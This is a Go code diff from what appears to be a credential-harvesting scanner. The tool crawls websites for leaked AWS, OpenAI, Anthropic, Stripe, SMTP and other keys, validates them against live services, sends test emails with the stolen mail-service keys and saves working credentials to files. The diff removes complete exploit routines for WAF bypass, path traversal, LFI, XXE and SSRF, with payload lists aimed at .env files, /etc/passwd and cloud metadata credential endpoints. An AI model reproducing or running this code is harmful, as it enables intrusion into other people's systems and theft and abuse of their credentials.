@@ -660,21 +660,6 @@ func (e *Enhancer) CrawlAndExtract(startURL string, maxDepth int, a *AWSScanner)
 		if a.Config.ExploitMethods.React2Shell {
 			a.ExploitReact2Shell(item.url, item.url)
 		}
-		if a.Config.ExploitMethods.BypassWAF {
-			a.ExploitBypassWAF(item.url, item.url)
-		}
-		if a.Config.ExploitMethods.BypassMiddleware {
-			a.ExploitBypassMiddleware(item.url, item.url)
-		}
-		if a.Config.ExploitMethods.LFI {
-			a.ExploitLFI(item.url, item.url)
-		}
-		if a.Config.ExploitMethods.XXE {
-			a.ExploitXXE(item.url, item.url)
-		}
-		if a.Config.ExploitMethods.SSRF {
-			a.ExploitSSRF(item.url, item.url)
-		}
 
 		scripts := e.extractScriptSrc(body, item.url)
 		for _, s := range scripts {
@@ -2263,11 +2248,11 @@ func (a *AWSScanner) CheckGCPKey(key, sourceURL string) bool {
 
 			if resp.StatusCode == 403 && strings.Contains(body, "API not enabled") {
 				a.logValid("GCP Key", fmt.Sprintf("Key: %s | Status: LIVE (API Disabled)", key))
-				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_gcp_key.txt")
+				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_gcp_key.txt")
 				a.storeValidKeyLimit("GCP Key", key, "LIVE (API Disabled)")
 			} else if resp.StatusCode == 200 || (resp.StatusCode == 400 && !strings.Contains(body, "API key not valid")) {
 				a.logValid("GCP Key", fmt.Sprintf("Key: %s | Status: LIVE", key))
-				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_gcp_key.txt")
+				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_gcp_key.txt")
 				a.storeValidKeyLimit("GCP Key", key, "LIVE")
 			} else {
 				return false
@@ -2383,7 +2368,7 @@ func (a *AWSScanner) CheckOpenAI(key, sourceURL string) bool {
 
 		if resp.StatusCode == 200 {
 			a.logValid("OpenAI", key)
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_openai.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_openai.txt")
 			a.storeValidKeyLimit("OpenAI", key, "Active")
 
 			globalCounters.mu.Lock()
@@ -2434,7 +2419,7 @@ func (a *AWSScanner) CheckAnthropic(key, sourceURL string) bool {
 
 		if resp.StatusCode == 200 {
 			a.logValid("Anthropic", key)
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_anthropic.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_anthropic.txt")
 			a.storeValidKeyLimit("Anthropic", key, "Active")
 
 			globalCounters.mu.Lock()
@@ -2494,7 +2479,7 @@ func (a *AWSScanner) CheckTwilio(sid, auth, sourceURL string) bool {
 			friendlyName, _ := res["friendly_name"].(string)
 
 			a.logValid("Twilio", fmt.Sprintf("SID: %s | Status: %s", sid, status))
-			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceURL, sid, auth), "valid_twilio.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), sid, auth), "valid_twilio.txt")
 			a.storeValidKeyLimit("Twilio", sid, fmt.Sprintf("%s (%s)", friendlyName, status))
 
 			globalCounters.mu.Lock()
@@ -2569,7 +2554,7 @@ func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
 			emailResult := a.SendEmailViaSendGrid(key, sourceURL, fromEmail)
 
 			a.logValid("SendGrid", key)
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_sendgrid.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_sendgrid.txt")
 
 			emailStatus := "❌ Failed"
 			quotaInfo := fmt.Sprintf("%.0f Total Credits", total)
@@ -2656,7 +2641,7 @@ func (a *AWSScanner) CheckStripe(key, sourceURL string) bool {
 			}
 
 			a.logValid("Stripe", fmt.Sprintf("%s | Mode: %s | Key: %s", keyType, mode, key))
-			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sourceURL, keyType, mode, key), "valid_stripe.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), keyType, mode, key), "valid_stripe.txt")
 			a.storeValidKeyLimit("Stripe", key, fmt.Sprintf("%s (%s)", keyType, mode))
 
 			globalCounters.mu.Lock()
@@ -2721,7 +2706,7 @@ func (a *AWSScanner) CheckMailgun(key, sourceURL string) bool {
 			emailResult := a.SendEmailViaMailgun(key, sourceURL, fromEmail)
 
 			a.logValid("Mailgun", fmt.Sprintf("Key: %s | Domains: %.0f", key, total))
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_mailgun.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_mailgun.txt")
 
 			emailStatus := "❌ Failed"
 			domainInfo := fmt.Sprintf("%.0f Domains", total)
@@ -2791,7 +2776,7 @@ func (a *AWSScanner) CheckTelnyx(key, sourceURL string) bool {
 			currency, _ := data["currency"].(string)
 
 			a.logValid("Telnyx", fmt.Sprintf("Key: %s | Balance: %s %s", key, balance, currency))
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_telnyx.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_telnyx.txt")
 			a.storeValidKeyLimit("Telnyx", key, fmt.Sprintf("%s %s", balance, currency))
 
 			globalCounters.mu.Lock()
@@ -2844,7 +2829,7 @@ func (a *AWSScanner) CheckMessageBird(key, sourceURL string) bool {
 			currency, _ := res["currency"].(string)
 
 			a.logValid("MessageBird", fmt.Sprintf("Key: %s | Balance: %.2f %s", key, amount, currency))
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_messagebird.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_messagebird.txt")
 			a.storeValidKeyLimit("MessageBird", key, fmt.Sprintf("%.2f %s", amount, currency))
 
 			globalCounters.mu.Lock()
@@ -2898,7 +2883,7 @@ func (a *AWSScanner) CheckBrevo(key, sourceURL string) bool {
 			emailResult := a.SendEmailViaBrevo(key, sourceURL, fromEmail)
 
 			a.logValid("Brevo", fmt.Sprintf("Key: %s | Email: %s", key, email))
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_brevo.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_brevo.txt")
 
 			emailStatus := "❌ Failed"
 			quotaInfo := ""
@@ -2963,7 +2948,7 @@ func (a *AWSScanner) CheckXSMTP(key, sourceURL string) bool {
 		defer resp.Body.Close()
 		if resp.StatusCode == 200 {
 			a.logValid("XSMTP", key)
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_xsmtp.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_xsmtp.txt")
 			a.storeValidKeyLimit("XSMTP", key, "Active")
 
 			globalCounters.mu.Lock()
@@ -3008,7 +2993,7 @@ func (a *AWSScanner) CheckTencent(key, sourceURL string) bool {
 		// Even if it fails, a 401/403 means the key exists
 		if resp.StatusCode == 200 || resp.StatusCode == 401 || resp.StatusCode == 403 {
 			a.logValid("Tencent", key)
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_tencent.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_tencent.txt")
 			a.storeValidKeyLimit("Tencent", key, "Active")
 
 			globalCounters.mu.Lock()
@@ -3062,7 +3047,7 @@ func (a *AWSScanner) CheckMandrill(key, sourceURL string) bool {
 			emailResult := a.SendEmailViaMandrill(key, sourceURL, fromEmail)
 
 			a.logValid("Mandrill", fmt.Sprintf("Key: %s | User: %s", key, username))
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_mandrill.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_mandrill.txt")
 
 			emailStatus := "❌ Failed"
 			if emailResult["success"].(bool) {
@@ -3130,7 +3115,7 @@ func (a *AWSScanner) CheckMailerSend(key, sourceURL string) bool {
 			emailResult := a.SendEmailViaMailerSend(key, sourceURL, fromEmail)
 
 			a.logValid("MailerSend", fmt.Sprintf("Key: %s | Domains: %d", key, domainCount))
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_mailersend.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_mailersend.txt")
 
 			emailStatus := "❌ Failed"
 			if emailResult["success"].(bool) {
@@ -3197,7 +3182,7 @@ func (a *AWSScanner) CheckNexmo(key, secret, sourceURL string) bool {
 			value, _ := res["value"].(float64)
 
 			a.logValid("Nexmo", fmt.Sprintf("Key: %s | Balance: %.2f EUR", key, value))
-			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceURL, key, secret), "valid_nexmo.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), key, secret), "valid_nexmo.txt")
 			a.storeValidKeyLimit("Nexmo", key, fmt.Sprintf("%.2f EUR", value))
 
 			globalCounters.mu.Lock()
@@ -3300,7 +3285,7 @@ func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
 	if host != "" && port != "" && user != "" && pass != "" && from != "" {
 		smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
 		a.logFound("SMTP", smtpLine, sourceURL)
-		a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_found.txt")
+		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), smtpLine), "smtp_found.txt")
 
 		if a.Config.SMTPTestEmail == "" {
 			return
@@ -3478,7 +3463,7 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		for _, key := range keys {
 			if _, loaded := a.KnownKeys.LoadOrStore(key, true); !loaded {
 				a.logFound(check.Name, key, sourceURL)
-				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), strings.ReplaceAll(check.Name, " ", "_")+"_found.txt")
+				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), strings.ReplaceAll(check.Name, " ", "_")+"_found.txt")
 
 				globalCounters.mu.Lock()
 				globalCounters.APIsFoundTotal++
@@ -3533,7 +3518,7 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 							globalCounters.mu.Unlock()
 						} else {
 							// Jika gagal validasi, simpan sebagai potential key yang belum terverifikasi
-							a.saveIntoFile(fmt.Sprintf("%s:%s:%s", u, ak, sk), "aws_ses_potential_unverified.txt")
+							a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(u), ak, sk), "aws_ses_potential_unverified.txt")
 							pterm.Debug.Printfln("[AWS FAIL] Key %s failed full STS validation.", ak[:8]+"...")
 						}
 					}(ak, sk, sourceURL, name)
@@ -3652,6 +3637,11 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 
 // Exploit functions untuk ekstraksi credentials
 // React2Shell - exploit React applications untuk ekstraksi credentials
+func sanitizeSource(url string) string {
+	s := strings.TrimPrefix(url, "https://")
+	return strings.TrimPrefix(s, "http://")
+}
+
 func (a *AWSScanner) ExploitReact2Shell(targetURL, sourceURL string) {
 	payloads := []string{
 		"/api/config",
@@ -3706,303 +3696,6 @@ func (a *AWSScanner) ExploitReact2Shell(targetURL, sourceURL string) {
 	}
 }
 
-// BypassWAF - teknik bypass WAF untuk ekstraksi credentials
-func (a *AWSScanner) ExploitBypassWAF(targetURL, sourceURL string) {
-	// Teknik bypass WAF dengan encoding dan header manipulation
-	bypassPayloads := []string{
-		"/api/v1/config",
-		"/api/v1/env",
-		"/api/v1/secrets",
-		"/.git/config",
-		"/.env",
-		"/config/config.json",
-		"/app/config.json",
-	}
-
-	bypassHeaders := []map[string]string{
-		{"X-Forwarded-For": "127.0.0.1"},
-		{"X-Real-IP": "127.0.0.1"},
-		{"X-Originating-IP": "127.0.0.1"},
-		{"X-Remote-IP": "127.0.0.1"},
-		{"X-Remote-Addr": "127.0.0.1"},
-		{"X-Client-IP": "127.0.0.1"},
-		{"X-Forwarded-Host": "localhost"},
-		{"X-Original-URL": "/.env"},
-		{"X-Rewrite-URL": "/.env"},
-	}
-
-	foundCount := 0
-	maxFindings := 2 // Limit findings untuk bypass WAF
-
-outerLoop:
-	for _, payload := range bypassPayloads {
-		for _, headers := range bypassHeaders {
-			if foundCount >= maxFindings {
-				pterm.Debug.Printfln("[BYPASS-WAF] Early exit after %d findings", foundCount)
-				break outerLoop // Exit dari nested loop
-			}
-
-			fullURL := targetURL + payload
-			req, _ := http.NewRequest("GET", fullURL, nil)
-			for k, v := range headers {
-				req.Header.Set(k, v)
-			}
-			req.Header.Set("User-Agent", "Mozilla/5.0")
-
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			resp, err := client.Do(req.WithContext(ctx))
-			cancel()
-
-			if err == nil {
-				defer resp.Body.Close()
-				if resp.StatusCode == 200 {
-					body, _ := ioutil.ReadAll(resp.Body)
-					content := string(body)
-					if len(content) > 100 {
-						a.checkAndSaveKeys(content, sourceURL+" (bypass-waf:"+payload+")")
-						foundCount++
-					}
-				}
-			}
-		}
-	}
-}
-
-// BypassMiddleware - exploit middleware untuk ekstraksi credentials
-func (a *AWSScanner) ExploitBypassMiddleware(targetURL, sourceURL string) {
-	// Teknik bypass middleware dengan path traversal dan parameter pollution
-	middlewarePayloads := []string{
-		"/../.env",
-		"/..//.env",
-		"/....//....//.env",
-		"/%2e%2e%2f.env",
-		"/%2e%2e%2f%2e%2e%2f.env",
-		"/api/config?path=../.env",
-		"/api/config?file=../../.env",
-		"/api/config?path=....//....//.env",
-		"/admin/config?redirect=/.env",
-		"/api/v1/config?callback=/.env",
-	}
-
-	foundCount := 0
-	maxFindings := 2 // Limit findings untuk bypass middleware
-
-	for _, payload := range middlewarePayloads {
-		if foundCount >= maxFindings {
-			pterm.Debug.Printfln("[BYPASS-MIDDLEWARE] Early exit after %d findings", foundCount)
-			break // Early exit
-		}
-
-		fullURL := targetURL + payload
-		req, _ := http.NewRequest("GET", fullURL, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		req.Header.Set("Accept", "*/*")
-
-		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-		resp, err := client.Do(req.WithContext(ctx))
-		cancel()
-
-		if err == nil {
-			defer resp.Body.Close()
-			if resp.StatusCode == 200 {
-				body, _ := ioutil.ReadAll(resp.Body)
-				content := string(body)
-				if len(content) > 100 {
-					a.checkAndSaveKeys(content, sourceURL+" (bypass-middleware:"+payload+")")
-					foundCount++
-				}
-			}
-		}
-	}
-}
-
-// ExploitLFI - Local File Inclusion untuk ekstraksi credentials
-func (a *AWSScanner) ExploitLFI(targetURL, sourceURL string) {
-	lfiPayloads := []string{
-		"/?file=../../../../etc/passwd",
-		"/?page=../../../../etc/passwd",
-		"/?include=../../../../etc/passwd",
-		"/?path=../../../../etc/passwd",
-		"/?doc=../../../../etc/passwd",
-		"/?document=../../../../etc/passwd",
-		"/?folder=../../../../etc/passwd",
-		"/?root=../../../../etc/passwd",
-		"/?page=php://filter/read=string.rot13/resource=../../../../etc/passwd",
-		"/?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd",
-		"/?file=../../../../.env",
-		"/?page=../../../../.env",
-		"/?include=../../../../.env",
-		"/?path=../../../../.env",
-		"/?doc=../../../../.env",
-		"/?document=../../../../.env",
-		"/?folder=../../../../.env",
-		"/?root=../../../../.env",
-		"/?file=../../../../config.json",
-		"/?page=../../../../config.json",
-		"/?include=../../../../config.json",
-		"/?path=../../../../config.json",
-	}
-
-	foundCount := 0
-	maxFindings := 1 // LFI jarang berhasil, 1 finding cukup
-
-	for _, payload := range lfiPayloads {
-		if foundCount >= maxFindings {
-			pterm.Debug.Printfln("[LFI] Early exit after %d findings", foundCount)
-			break // Early exit
-		}
-
-		fullURL := targetURL + payload
-		req, _ := http.NewRequest("GET", fullURL, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-
-		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-		resp, err := client.Do(req.WithContext(ctx))
-		cancel()
-
-		if err == nil {
-			defer resp.Body.Close()
-			if resp.StatusCode == 200 {
-				body, _ := ioutil.ReadAll(resp.Body)
-				content := string(body)
-				// Cek apakah berhasil membaca file (bukan error page)
-				if strings.Contains(content, "root:") || strings.Contains(content, "AKIA") || strings.Contains(content, "api_key") || strings.Contains(content, "SECRET") {
-					a.checkAndSaveKeys(content, sourceURL+" (lfi:"+payload+")")
-					foundCount++
-				}
-			}
-		}
-	}
-}
-
-// ExploitXXE - XML External Entity untuk ekstraksi credentials
-func (a *AWSScanner) ExploitXXE(targetURL, sourceURL string) {
-	xxePayloads := []string{
-		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
-		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>`,
-		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>`,
-		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///.env">]><foo>&xxe;</foo>`,
-		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=file:///.env">]><foo>&xxe;</foo>`,
-		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///.env">]><foo>&xxe;</foo>`,
-	}
-
-	xxeEndpoints := []string{
-		"/api/xml",
-		"/api/upload",
-		"/api/parse",
-		"/api/process",
-		"/upload",
-		"/parse",
-		"/process",
-		"/xml",
-		"/soap",
-		"/wsdl",
-	}
-
-	foundCount := 0
-	maxFindings := 1 // XXE jarang berhasil, 1 finding cukup
-
-outerLoop:
-	for _, endpoint := range xxeEndpoints {
-		for _, payload := range xxePayloads {
-			if foundCount >= maxFindings {
-				pterm.Debug.Printfln("[XXE] Early exit after %d findings", foundCount)
-				break outerLoop // Exit dari nested loop
-			}
-
-			fullURL := targetURL + endpoint
-			req, _ := http.NewRequest("POST", fullURL, strings.NewReader(payload))
-			req.Header.Set("Content-Type", "application/xml")
-			req.Header.Set("User-Agent", "Mozilla/5.0")
-
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			resp, err := client.Do(req.WithContext(ctx))
-			cancel()
-
-			if err == nil {
-				defer resp.Body.Close()
-				if resp.StatusCode == 200 {
-					body, _ := ioutil.ReadAll(resp.Body)
-					content := string(body)
-					// Cek apakah berhasil membaca file
-					if strings.Contains(content, "root:") || strings.Contains(content, "AKIA") || strings.Contains(content, "api_key") || strings.Contains(content, "SECRET") {
-						a.checkAndSaveKeys(content, sourceURL+" (xxe:"+endpoint+")")
-						foundCount++
-					}
-				}
-			}
-		}
-	}
-}
-
-// ExploitSSRF - Server-Side Request Forgery untuk ekstraksi credentials
-func (a *AWSScanner) ExploitSSRF(targetURL, sourceURL string) {
-	ssrfPayloads := []string{
-		"/?url=http://127.0.0.1:80",
-		"/?url=http://127.0.0.1:443",
-		"/?url=http://127.0.0.1:8080",
-		"/?url=http://127.0.0.1:3000",
-		"/?url=http://127.0.0.1:5000",
-		"/?url=http://localhost:80",
-		"/?url=http://localhost:443",
-		"/?url=http://localhost:8080",
-		"/?url=http://localhost:3000",
-		"/?url=http://localhost:5000",
-		"/?url=http://169.254.169.254/latest/meta-data/",
-		"/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-		"/?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
-		"/?url=http://169.254.169.254/metadata/instance?api-version=2018-02-01",
-		"/?url=file:///etc/passwd",
-		"/?url=file:///.env",
-		"/?url=file:///config.json",
-		"/?url=gopher://127.0.0.1:80",
-		"/?url=dict://127.0.0.1:80",
-		"/?url=ldap://127.0.0.1:80",
-		"/?target=http://127.0.0.1:80",
-		"/?uri=http://127.0.0.1:80",
-		"/?path=http://127.0.0.1:80",
-		"/?link=http://127.0.0.1:80",
-		"/?src=http://127.0.0.1:80",
-		"/?dest=http://127.0.0.1:80",
-		"/?redirect=http://127.0.0.1:80",
-		"/?callback=http://127.0.0.1:80",
-		"/?webhook=http://127.0.0.1:80",
-		"/api/fetch?url=http://127.0.0.1:80",
-		"/api/proxy?url=http://127.0.0.1:80",
-		"/api/request?url=http://127.0.0.1:80",
-	}
-
-	foundCount := 0
-	maxFindings := 2 // SSRF bisa menemukan metadata yang berguna, limit 2
-
-	for _, payload := range ssrfPayloads {
-		if foundCount >= maxFindings {
-			pterm.Debug.Printfln("[SSRF] Early exit after %d findings", foundCount)
-			break // Early exit
-		}
-
-		fullURL := targetURL + payload
-		req, _ := http.NewRequest("GET", fullURL, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-
-		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-		resp, err := client.Do(req.WithContext(ctx))
-		cancel()
-
-		if err == nil {
-			defer resp.Body.Close()
-			if resp.StatusCode == 200 {
-				body, _ := ioutil.ReadAll(resp.Body)
-				content := string(body)
-				// Cek apakah berhasil membaca internal resources
-				if strings.Contains(content, "AKIA") || strings.Contains(content, "api_key") || strings.Contains(content, "SECRET") || strings.Contains(content, "access-key") || strings.Contains(content, "secret-key") {
-					a.checkAndSaveKeys(content, sourceURL+" (ssrf:"+payload+")")
-					foundCount++
-				}
-			}
-		}
-	}
-}
 
 // ExtractIPOnly - ekstrak hanya IP address dari URL atau teks
 func (a *AWSScanner) ExtractIPOnly(input string) []string {
@@ -4108,7 +3801,7 @@ func (a *AWSScanner) extractValidatorsFromCode(code, sourceURL string) {
 		// SMTP valid ditemukan
 		smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
 		a.logFound("SMTP (AST)", smtpLine, sourceURL)
-		a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_found.txt")
+		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), smtpLine), "smtp_found.txt")
 
 		// Test SMTP jika email target dikonfigurasi
 		if a.Config.SMTPTestEmail != "" {
@@ -4474,7 +4167,7 @@ func (a *AWSScanner) testSMTPConnection(host, port, user, pass, from, sourceURL 
 		if err == nil {
 			smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
 			a.logValid("SMTP (AST)", smtpLine)
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_valid.txt")
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), smtpLine), "smtp_valid.txt")
 
 			globalCounters.mu.Lock()
 			globalCounters.ValidSMTP++
@@ -4507,7 +4200,7 @@ func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.
 	}
 
 	a.logValid("AWS", fmt.Sprintf("%s (S3: %s)", keyLine, s3Status))
-	a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceURL, keyLine, a.DefaultRegion), "aws_credentials.txt")
+	a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), keyLine, a.DefaultRegion), "aws_credentials.txt")
 	a.saveIntoFile(fmt.Sprintf("%s:%s", ak, sk), "aws_valid.txt")
 
 	globalCounters.mu.Lock()
@@ -4723,21 +4416,6 @@ func (a *AWSScanner) createRequest(domain string) {
 		// Sequential execution untuk menghindari ledakan goroutine
 		if a.Config.ExploitMethods.React2Shell {
 			a.ExploitReact2Shell(mainURL, mainURL)
-		}
-		if a.Config.ExploitMethods.BypassWAF {
-			a.ExploitBypassWAF(mainURL, mainURL)
-		}
-		if a.Config.ExploitMethods.BypassMiddleware {
-			a.ExploitBypassMiddleware(mainURL, mainURL)
-		}
-		if a.Config.ExploitMethods.LFI {
-			a.ExploitLFI(mainURL, mainURL)
-		}
-		if a.Config.ExploitMethods.XXE {
-			a.ExploitXXE(mainURL, mainURL)
-		}
-		if a.Config.ExploitMethods.SSRF {
-			a.ExploitSSRF(mainURL, mainURL)
 		}
 
 		commonPaths := append(a.EnvPaths, a.PHPInfoPaths...)
